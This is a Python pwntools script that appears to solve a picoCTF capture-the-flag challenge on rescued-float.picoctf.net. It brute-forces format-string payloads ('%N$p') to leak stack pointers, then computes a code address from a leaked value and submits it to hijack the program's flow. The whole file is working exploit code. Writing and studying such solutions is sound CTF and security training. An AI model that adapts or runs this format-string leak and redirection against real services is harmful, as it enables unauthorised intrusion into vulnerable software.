from pwn import *

host = 'rescued-float.picoctf.net'
port = 52379

def attempt_exploit(index):
    if index > 150:
        return

    try:
        io = remote(host, port, level='error')
        io.sendlineafter(b"Enter your name:", f"%{index}$p".encode())
        
        leak = io.recvline().decode().strip()
        
        if "0x" not in leak or "(nil)" in leak:
            io.close()
            return attempt_exploit(index + 1)

        address_int = int(leak, 16)
        last_three = address_int & 0xfff
        
        if 0x400 <= last_three <= 0x447:
            print(f'Trying {address_int}...')
            # Mask to page base, set to 400, subtract 150
            target_addr = (address_int & ~0xfff) + 0x400 - 150
            
            io.sendlineafter(b"ex => 0x12345:", hex(target_addr).encode())
            
            response = io.recvall(timeout=1).decode()
            if "You won!" in response:
                print(response)
                return 
            print('Failed\n')

        io.close()
        return attempt_exploit(index + 1)

    except (EOFError, PwnlibException):
        return attempt_exploit(index + 1)

if __name__ == "__main__":
    attempt_exploit(1)
